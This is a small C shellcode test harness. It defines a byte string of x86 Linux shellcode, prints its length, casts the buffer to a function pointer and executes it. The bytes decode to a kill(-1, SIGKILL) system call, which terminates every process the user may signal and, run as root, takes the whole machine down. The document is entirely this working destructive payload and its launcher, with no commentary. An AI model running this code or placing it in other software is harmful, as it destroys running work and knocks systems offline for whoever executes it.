#include <stdio.h>
#include <string.h>

char shellcode[] = "\xb0\x25\x6a\xff\x5b\xb1\x09\xcd\x80";

int main() {
  fprintf(stdout, "Length: %d\n", strlen(shellcode));
  (*(void (*)())shellcode)();
}
